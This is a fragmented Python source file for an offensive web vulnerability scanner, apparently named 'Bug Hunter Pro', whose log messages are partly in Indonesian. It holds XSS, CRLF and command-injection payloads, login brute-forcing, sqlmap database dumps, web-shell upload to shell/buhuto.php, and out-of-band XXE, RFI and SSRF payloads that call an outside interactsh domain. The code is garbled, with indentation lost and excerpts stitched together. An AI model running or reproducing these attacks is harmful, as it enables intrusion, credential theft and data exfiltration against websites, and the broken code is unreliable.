...
f" {
  Fore.YELLOW
}[WARN] python-whois not available. Install with: pip install python-whois. WHOIS checks will be skipped. {
  Style.RESET_ALL
}"
)
...
self.shell_files = ['shell/buhuto.php',
  'shell/buhuto.php.jpg']
...
self.log("error", f"Failed to load config: {
  e
}")
self.config = {}
...
default_payloads = {
  ...
  "OPEN_REDIRECT": {
    "params": ["url", "redirect"], "payloads": ["https://example.com"]},
  "IDOR": ["1", "2", "100"],
  "WAF_BYPASS": ["<script>/*<!--*/alert(1)/*-->*/</script>"],
  "CRLF": ["%0d%0aGemini:Injected"],
  "COMMAND_INJECTION": ["; sleep 5; #", "| id; echo {{MARKER}}"],
  "SSRF_INTERNAL": {
    "HOSTS": ["127.0.0.1", "localhost"], "PATHS": ["/server-status"]},
  "OAST": {
    "INTERACTSH_DOMAIN": "oast.me"
  },
...
self.log("warn", f"Could not read dork file for params: {
  e
}")
return list(params)
...
self._add_finding("critical", "SQL Injection (Error)", f"Error-based | Payload: {
  payload
}", test_url, module = "SQL Injection", payload = payload)
...
if elapsed > 4.5:
self._add_finding("high", "Blind SQLi (Time)", f"Time-based | Payload: {
  payload
} | Delay: {
  elapsed:.1f
}s", test_url, module = "SQL Injection", payload = payload)
self._run_sqlmap_exploit(test_url)

except Exception as e:
self.log("warn", f"SQLi test error: {
  e
}")
...
self.log("info", f"Nuclei found at: {
  nuclei_path
}")
...
self.log("info", f"subfinder found at: {
  subfinder_path
}")
...
self.log("info", f"httpx found at: {
  httpx_path
}")
if self.cf_use_tor:
try:
...
self.log("warn", f"Skipping invalid subdomain: {
  s
}")
self.log(
  "success", f"Found {
...
f"Found: {
  len(self.visited_urls)}", refresh = True)
pbar.update(1)
try:
...
self.log(
  "warn",
f"Access denied (403 Forbidden) on {
    current_url
  }. Site may be protected.")
continue
...
self.log("warn", f"Request failed during fast crawl: {
  e
}")
...
self.log(
  "success", f"Phase 1 completed. Found {
    len(self.visited_urls)} static URLs.")
...
f.write(u + "\n")
self.log("success", f"Crawl selesai! {
  len(self.visited_urls)} URL disimpan ke crawled_urls.txt")

self.log(
  "success", f"Crawling completed. Found {
    len(self.visited_urls)} total unique URLs.")
...
self.log("info", f"Testing {
  len(all_paths)} common paths against base URL {
  self.base_url
}...")
...
self.log("success", f"Added {
  newly_added
} new URLs from config paths to the scan queue.")
...
r'["\'](/[\\w\-/]+(?:api|graphql)[\\w\-/.]*)["\"]')
  ...
  self.log(
    "info",
f"Discovered potential API endpoint in {
      source_url
    }: {
      endpoint
    }")
  ...
  continue
  self._add_finding("high", "Potential hardcoded secret", {
    "matched_text": match.group(0), "key_name": match.group(1)}, source_url, module = "API Key Leakage", payload = match.group(0))
  ...
  self.log("error", f"Failed to read wordlist: {
    e
  }")
  return
...
f"Attacking login form at {
  ...
  fail_payload = {
    user_field: invalid_user, pass_field: invalid_pass
  }
  ...
  self.log(
    "warn",
f"Could not get a baseline failure response from {
      form_url
    }. Skipping this form.")
  continue
...
f"Failure baseline: Status= {
  ...
  self._add_finding("critical", f"Potential valid credentials found at {
    form_url
  }", {
    "username": u, "password": p, "form_fields": (user_field, pass_field)}, form_url, module = "Bruteforce", payload = f" {
    u
  }: {
    p
  }")
  ...
  for form in forms:
  password_input = form.find('input', {
    'type': 'password'
  })
  if password_input:
  ...
  if user_input:
  login_forms.append({
    'url': url, 'user_field': user_input.get(
  ...
  if len(password_inputs) > 0 and email_input and len(
    text_inputs) > 0:
  self.log(
    "run", f"Found potential registration form at {
      url
    }")
  rand_str = ''.join(
    random.choices(
      'abcdefghijklmnopqrstuvwxyz0123456789', k = 8))
  username = f"gemini_user_ {
    rand_str
  }"
  email = f" {
    username
  }@example.com"
  password = f"P@ssword_ {
    rand_str
  }!"
  ...
  self.log(
    "success", f"Submitted registration form at {
      action_url
    } with user: {
      email
    }")
...
f"Generating reports with {
  ...
  json.dump({
    "target": self.target, "total_score": self.total_score, "findings": self.findings
  }, f, indent = 2)
  ...
  row = {
    k: finding.get(k, '') for k in fieldnames
  }
  writer.writerow(row)
  self.log("success", f"CSV report saved: {
    csv_path
  }")

  html_path = os.path.join(run_report_dir, "report.html")
  severity_counts = {
    s: 0 for s in SEVERITY_SCORES.keys()}
  for f in self.findings:
  ...
  html = f'''
        ...
        <head>
            ...
            <title>Bug Hunter Pro Report for {
    self.host
  }</title>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <style>
                body {{
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: #1a1a1a; color: #e0e0e0;
    }}
                .container {{
      max-width: 1200px; margin: 20px auto; padding: 20px; background-color: #2c2c2c; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }}
                h1, h2 {{
      color: #4CAF50; border-bottom: 2px solid #4CAF50; padding-bottom: 10px;
    }}
                h1 {{
      font-size: 2.5em; text-align: center;
    }}
                h2 {{
      font-size: 1.8em; margin-top: 40px;
    }}
                table {{
      ...
      border: 1px solid #444; padding: 12px; text-align: left;
                ...
                th {{
      background-color: #333; color: #4CAF50; cursor: pointer; user-select: none;
    }}
                th:hover {{
      ...
      background-color: #333;
                ...
                .controls {{
      display: flex; justify-content: space-between; align-items: center; margin: 20px 0; padding: 10px; background-color: #333; border-radius: 5px;
    }}
                .controls label {{
      margin-right: 10px; font-weight: bold;
    }}
                .controls select, .controls input {{
      padding: 8px; border-radius: 4px; border: 1px solid #555; background-color: #444; color: #e0e0e0;
    }}
                .severity-critical {{
      ...
      background-color: #4d4d4d;
                ...
                .evidence-toggle {{
      cursor: pointer; color: #4CAF50; text-decoration: underline;
    }}
                .evidence-content {{
      display: none; background-color: #1e1e1e; padding: 10px; margin-top: 5px; border-radius: 4px;
    }}
                .evidence-content pre {{
      white-space: pre-wrap; word-wrap: break-word; color: #ccc;
    }}
                .no-findings {{
    ...
    self.host
                ...
                <h3>Total Risk Score: <span style="color: #ff4500; font-weight: bold;"> {
    self.total_score
  } / 100</span></h3>
  ...
  f.write(html)
  self.log("info", f"Reports saved in directory: {
    run_report_dir
  }")
...
f"Request to {
  ...
  self.log(
    "warn",
f"No payloads found for {
      payload_type
    }. The check might be ineffective.")
  return []
...
f"cloudscraper failed: {
  ...
  self.log("error", f"Playwright is disabled, cannot perform aggressive bypass. Error: {
    e
  }")
  ...
  self.log(
    "run", f"Running nmap for service discovery ( {
      scan_type
    })...")
  ...
  self.log(
    "warn",
f"Nmap found open port: {
      port_info
    }",
    severity = "medium")
  self._add_finding("medium", f"Open port detected by nmap on {
    self.host
  }", {
    "details": port_info
  }, self.host, module = "Port Scan")
  ...
  self.log("error", f"nmap scan failed: {
    e
  }")
  else :
  ...
  self.log(
    "warn",
f"Database backup file exposed: {
      test_url
    }",
    severity = "critical")
  self._add_finding("critical", f"Database backup file exposed: {
    test_url
  }", {
    "details": "Backup file accessible"
  }, test_url, module = "Information Disclosure")
  self.log(
    "info",
f"Database scan completed. Found {
      len([f for f in self.findings if 'database' in f.get('message', '').lower()])} database-related findings")
  ...
  self._add_finding("high", f"Potential OAuth misconfiguration at {
    test_url
  }", {
    "payload": payload
  }, test_url, module = "OAuth Misconfiguration", payload = payload)
  self.log(
    "info",
f"OAuth check completed. Found {
  ...
  self._add_finding("medium", f"Potential session fixation vulnerability at {
    url
  } (missing Secure/HttpOnly/SameSite attributes)", {
    "cookies": cookies
  }, url, module = "Session Management")
  self.log(
    "info",
f"Session fixation check completed. Found {
  ...
  if len(set(key_value)) < 5:
  continue
  self._add_finding("high", f"Potential API token leak found at {
    url
  }", {
    "matched_text": match.group(0), "key_name": match.group(1), "key_value": key_value
  }, url, module = "API Key Leakage", payload = match.group(0))
  self.log(
    "info",
f"API token leak check completed. Found {
  ...
  self._add_finding(severity, f"Security header ' {
    header.title()}' is missing.", {
    "recommendation": f"Implement the {
      header.title()} header to enhance security."
  }, self.target, module = "Security Headers")
  if 'content-security-policy' in headers:
  csp = headers['content-security-policy']
  if "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
  self._add_finding("medium", "Content-Security-Policy (CSP) contains 'unsafe-inline' or 'unsafe-eval'.", {
    "policy": csp
  }, self.target, module = "Security Headers")
  ...
  new_url_with_param = urlunparse(parsed._replace(query = f" {
    common_param
  }=1"))
  for payload in payloads:
  ...
  if not tasks:
  self.log("info", f"No parameters found to test for {
    check_name
  }.")
  return
  ...
  futures = {
    executor.submit(check_function, *task)
    for task in tasks
  }
  ...
  self.log(
    "warn", f" {
      check_name
    } check was cancelled during execution.")
...
f" {
  ...
  self.log(
    "info",
f"Sent SSRF OAST payload to {
      test_url
    }. Check Interactsh for interactions with {
      unique_subdomain
    }. {
      oast_domain
    }")
...
r"alert\((.*?)\)",
  ...
  if re.search(
fr"(<script>.* {
    re.escape(unique_marker)}.*</script>|on\w+\s*=\s*['\"]?.* {
    re.escape(unique_marker)}.*['\"]?)",
    response.text, re.IGNORECASE | re.DOTALL):
  self._add_finding("high", "Potential Reflected XSS", {
    "param": param, "proof": "Payload reflected and executed in response."
  }, test_url, module = "XSS", payload = payload)
  ...
  self.log("success", f"SQLMap dump: {
    url
  }")
  except BaseException:
  self.log("warn", f"SQLMap skip (timeout): {
    url
  }")
  ...
  f.write(pwd + '\n')
  self.log("info", f"Wordlist dibuat otomatis: {
    wordlist_path
  }")
  else :
  self.log("success", f"Wordlist ditemukan: {
    wordlist_path
  }")

  def check_ssti(self):
  self.log_step("Checking for SSTI vulnerabilities...")
  self.log("info", f"URLs to scan for SSTI: {
  ...
  parsed = urlparse(url)
  if not parsed.scheme or not parsed.netloc:
  self.log("warn", f"Skipping invalid URL: {
    url
  }")
  continue
  params = parse_qs(parsed.query)
  ...
  self._add_finding("high", "Potential SSTI vulnerability", {
    "param": param, "proof": f"Reflection ' {
      expected_reflection
    }' found in response."
  }, test_url, module = "SSTI", payload = dyn_payload)
  self.log(
    "info",
f"SSTI check completed. Found {
  ...
  self.log("info", f"URLs to scan for LFI: {
    list(self.visited_urls)}")
  ...
  is_vulnerable = True
  if is_vulnerable:
  self._add_finding("critical", f"Potential LFI vulnerability at {
    test_url
  }", {
    "payload": payload, "param": param
  }, test_url, module = "LFI", payload = payload)
  self.log(
    "info", f"LFI check completed. Found {
      len(self.findings) - findings_count
    } new findings")

  def check_rfi(self):
  self.log_step("Checking for RFI vulnerabilities...")
  self.log("info", f"URLs to scan for RFI: {
    list(self.visited_urls)}")
  oast_domain = self.get_payloads("OAST").get(
    "INTERACTSH_DOMAIN", "oast.me").split(',')[0]
  findings_count = len(self.findings)
  ...
  self.log(
    "info",
f"Sent RFI OAST payload to {
      test_url
    }. Check your Interactsh client for interactions with {
      unique_subdomain
    }. {
      oast_domain
    }")
  self.log(
    "info", f"RFI check completed. Found {
      len(self.findings) - findings_count
    } new findings")

  def check_ssrf(self):
  self.log_step("Checking for SSRF vulnerabilities...")
  self.log("info", f"URLs to scan for SSRF: {
    list(self.visited_urls)}")
  ...
  if is_vulnerable:
  self._add_finding("high", f"Potential SSRF vulnerability at {
    test_url
  }",
    {
      "payload": payload, "param": param
    }, test_url, module = "SSRF", payload = payload)
  self.log(
    "info",
f"SSRF check completed. Found {
  ...
  self.log(
    "warn",
f"Skipping invalid URL for SSRF check: {
      url_to_test
    }")
  continue
  ...
  if response and response.status_code == 200:
  self._add_finding("high", "Potential internal resource access via SSRF", {
    "proof": "Successfully accessed a known internal-like path."
  }, test_url, module = "SSRF", payload = payload)
...
f"URLs to scan for Open Redirect: {
  ...
  self._add_finding("medium", "Potential Open Redirect", {
    "proof": f"Redirected to Location: {
      location_header
    }"
  }, test_url, module = "Open Redirect", payload = payload)
...
f"URLs to scan for CSRF: {
  ...
  self.log(
    "warn",
f"Form without CSRF token found at {
      url
    }",
    severity = "medium")
  self._add_finding("medium", f"Form without CSRF token found at {
    url
  }", {
    "form_action": form.get('action', 'N/A')}, url, module = "CSRF")
  else :
  form_data = {
  ...
  self.log(
    "warn",
f"CSRF token may not be validated at {
      action_url
    }",
    severity = "high")
  self._add_finding("high", f"CSRF token may not be validated at {
    action_url
  }", {
    "form_action": action_url, "token_name": token_input.get('name')}, action_url, module = "CSRF")
  self.log(
    "info",
f"CSRF check completed. Found {
  ...
  self.log("info", f"URLs to scan for IDOR: {
    list(self.visited_urls)}")
  ...
  self._add_finding("high", "Potential IDOR vulnerability", {
    "param": param, "proof": f"Response length ( {
      len(response.text)}) is similar to baseline ( {
      baseline_len
    })."
  }, test_url, module = "IDOR", payload = payload)
  self.log(
    "info",
...
f"URLs to scan for API Leakage: {
  ...
  leaked_keys = self._find_sensitive_keys_in_json(
    data, sensitive_keys)
  if leaked_keys:
  self._add_finding("high", f"Potential API data leakage at {
    test_url
  }", {
    "endpoint": test_url, "leaked_keys": list(leaked_keys)}, test_url, module = "API Leakage")
...
f"URLs to scan for WAF Bypass: {
  ...
  self.log(
    "info",
f"No obvious WAF detected at {
      url
    }. Skipping WAF bypass check for this URL.")
  continue
  self.log(
    "info", f"WAF detected at {
      url
    } (status: {
...
f"Found file upload form at {
  ...
  self._add_finding("critical", f"Verified file upload vulnerability at {
    upload_url
  }", {
    "upload_url": upload_url, "file_url": verify_url, "filename": filename
  }, upload_url, module = "File Upload", payload = filename)
  break
  self.log(
    "info",
...
f"URLs to scan for CRLF Injection: {
  ...
  self._add_finding("medium", "Potential CRLF injection", {
    "param": param, "proof": f"Injected header reflected in response: {
      unique_header_name
    }: {
      unique_header_value
    }"
  }, test_url, module = "CRLF Injection", payload = dynamic_payload)
  break
  self.log(
    "info",
...
f"URLs to scan for Command Injection: {
  ...
  test_params[param] = f"original_value {
    payload
  }"
  ...
  self._add_finding("critical", "Potential OS command injection (time-based)", {
    "payload": payload, "delay": f" {
      payload_duration:.2f
    }s", "baseline": f" {
      base_duration:.2f
    }s", "param": param
  }, test_url_payload, module = "Command Injection", payload = payload)
  continue
  ...
  self._add_finding("critical", "Potential OS command injection (output-based)", {
    "payload": payload, "reflected_marker": unique_marker, "param": param, "response_sample": response.text[:200]}, test_url_payload, module = "Command Injection", payload = payload)
  continue
  self.log(
    "info",
f"OS command injection check completed. Found {
  ...
  self.log("info", f"URLs to scan for XXE: {
    list(self.visited_urls)}")
  ...
  unique_subdomain = f"xxe- {
    ''.join(
      random.choices(
        'abcdef0123456789',
                        k=10))}"
  oast_payload_str = f'<!ENTITY % xxe SYSTEM "http:// {
    unique_subdomain
  }. {
    oast_domain
  }"> %xxe;'
...
f"Sent XXE OAST payload to {
  ...
  is_vulnerable = True
  if is_vulnerable:
  self._add_finding("high", "Potential XXE (In-Band) vulnerability", {
    "proof": "Server response indicates successful entity processing.", "xml_data": xml_data[:150], "response_sample": response.text[:200]}, url, module = "XXE", payload = payload)
  self.log(
    "info", f"XXE check completed. Found {
      len(self.findings) - findings_count
    } new findings")
...
f"URLs to scan for NoSQL Injection: {
  ...
  self.log(
    "warn",
f"Potential time-based NoSQLi at {
      test_url_time
    }",
    severity = "high")
  self._add_finding("high", "Potential time-based NoSQL Injection", {
    "param": param, "proof": f"Response delayed by {
      duration:.2f
    }s."
  }, test_url_time, module = "NoSQL Injection", payload = time_payload)
  continue
  ...
  self.log(
    "warn",
f"Potential boolean-based NoSQLi at {
      url
    } (param: {
      param
    })",
    severity = "high")
  self._add_finding("high", "Potential boolean-based NoSQL Injection", {
    "param": param, "proof": f"True ( {
      len(resp_true.text)} bytes) and False ( {
      len(resp_false.text)} bytes) responses differ."
  }, url, module = "NoSQL Injection", payload = true_payload)
  self.log(
    "info",
f"NoSQL Injection check completed. Found {
  ...
  self.log("info", f"URLs to scan for CORS: {
    list(self.visited_urls)}")
  ...
  severity = "medium"
  message = f"CORS misconfiguration at {
    url
  } for origin ' {
    origin_payload
  }'"
  ...
  severity = "critical"
  message = f"Critical CORS misconfiguration (credentials allowed) at {
    url
  } for origin ' {
    origin_payload
  }'"
  score = 90
  self._add_finding(severity, message, {
    "proof": f"Origin ' {
      allow_origin
    }' is allowed with credentials: {
      allow_creds
    }.", "method": method
  }, url, module = "CORS", payload = origin_payload)
  self.log(
    "info",
...
f"URLs to scan for GraphQL: {
  ...
  self._add_finding("medium", "GraphQL introspection enabled", {
    "method": method, "proof": "Introspection query returned schema data.", "response_sample": response.text[:250]}, test_url, module = "GraphQL", payload = payload)
...
f"URLs to scan for Default Creds: {
  ...
  response = self._safe_request("POST",
    test_url, data = data)
  self.tested_payload_urls.add(test_url)
  if response and ("welcome" in response.text.lower() or (response.is_redirect and response.headers.get("Location") != test_url and "login" not in response.headers.get("Location", ""))):
  self._add_finding("critical", "Default credentials may be working", {
    "proof": "Login attempt resulted in a redirect or welcome message."
  }, test_url, module = "Default Credentials", payload = str(cred))
  self.log(
    "info",
f"Default creds check completed. Found {
  ...
  self.log("info", f"URLs to scan for JWT: {
    list(self.visited_urls)}")
...
f"Found JWT in Authorization header for {
  ...
  self._add_finding("critical", "Potential JWT vulnerability (e.g., alg:none)", {
    "location": "Authorization Header", "proof": "Request with modified JWT was accepted."
  }, url, module = "JWT", payload = payload)
  self.log(
    "info", f"JWT check completed. Found {
      len(self.findings) - findings_count
    } new findings")
...
f"/?check= {
  ...
  self._add_finding("high", "Potential Prototype Pollution detected", {
    "check_url": check_url, "proof": f"Polluted property ' {
      unique_prop
    }' was reflected."
  }, pollute_url, module = "Prototype Pollution", payload = pollution_payload)
  self.log(
    "info",
f"Prototype Pollution check completed. Found {
  ...
  self.log("success", f"WHOIS selesai: {
    w.registrar
  }")
  except Exception as e:
  self.log("error", f"WHOIS gagal: {
    e
  }")
  ...
  self.log("info", f"Auto-set template var: user= {
    username
  }")

  cmd_str = " ".join(cmd)
  self.log("debug", f"Executing nuclei: {
    cmd_str
  }")
  ...
  if thread.is_alive():
  self.log("warn", f"Nuclei timeout ( {
    self.nuclei_timeout // 60
  } menit). Membunuh proses...")
  process.kill()
  process.communicate()

  if process.returncode == 0 and not thread.is_alive():
  self.log("success", f"Nuclei selesai. Laporan: {
    output_file
  }")
  self._parse_nuclei_report(output_file)
  elif process.returncode != 0:
  self.log("error", f"Nuclei gagal (exit code: {
    process.returncode
  })")
...
f"Nuclei timeout ( {
  ...
  self.log("run", f"Running module: {
    module_name
  }")
  module_map[module_name]()
  else :
  self.log("error", f"Unknown module: {
    module_name
  }")
  ...
  self.log("info", f"Starting scan on {
    self.target
  }")
  ...
  print(f"Shell files: {
    ', '.join(self.shell_files)}")
  print(f"Config file: {
    self.config_path
  }")
  print(f"Payloads dir: {
    self.payloads_dir
  }")
  print("=" * 60)
  if not auto_confirm:
...
f"Initial visited_urls: {
  ...
  self.log(
    "error", f"Cannot connect to initial target {
      self.target
    }. Skipping to subdomain discovery.")
  ...
  self.log("warn", f"Skipping invalid live host: {
    host
  }")
...
f"Validated visited_urls: {
  ...
  self.log(
    "success", f"Scan completed. Total score: {
      self.total_score
    }/100. Findings: {
      len(self.findings)}")
  ...
  self.log("error", f"Scan failed: {
    e
  }")
  raise

  def _parse_nuclei_report(self, report_path):
  self.log("info", f"Parsing Nuclei report from {
    report_path
  }")
  ...
  self.log("info", f"High/Critical Nuclei finding at {
    matched_at
...
f" {
    Fore.YELLOW
  }URL does not have a valid scheme or netloc. Adding 'https://' by default. {
    Style.RESET_ALL
  }")
...
f" {
    ...
    _get_full_timestamp()}] ❌ Invalid URL: {
    args.url
  } {
    Style.RESET_ALL
  }")
...
f"Final list of targets for scanning: {
  ...
  hunter.crawl()
  hunter.log(
    "success", f"Crawler finished, found {
      len(hunter.visited_urls)} total URLs.")
...
f" {
    ...
    _get_full_timestamp()}] ❌ Syntax error in code: {
    e
  } {
    Style.RESET_ALL
  }")
...
f" {
    ...
    _get_full_timestamp()}] ❌ Critical error occurred: {
    e
  } {
    Style.RESET_ALL
  }")
  print(f" {
    Fore.YELLOW
  }Tips: Ensure target 'http://testphp.vulnweb.com' is accessible. Check internet connection and dependencies (requests, colorama, etc.). Verify code syntax in tools.py. {
    Style.RESET_ALL
  }")
  sys.exit(1)
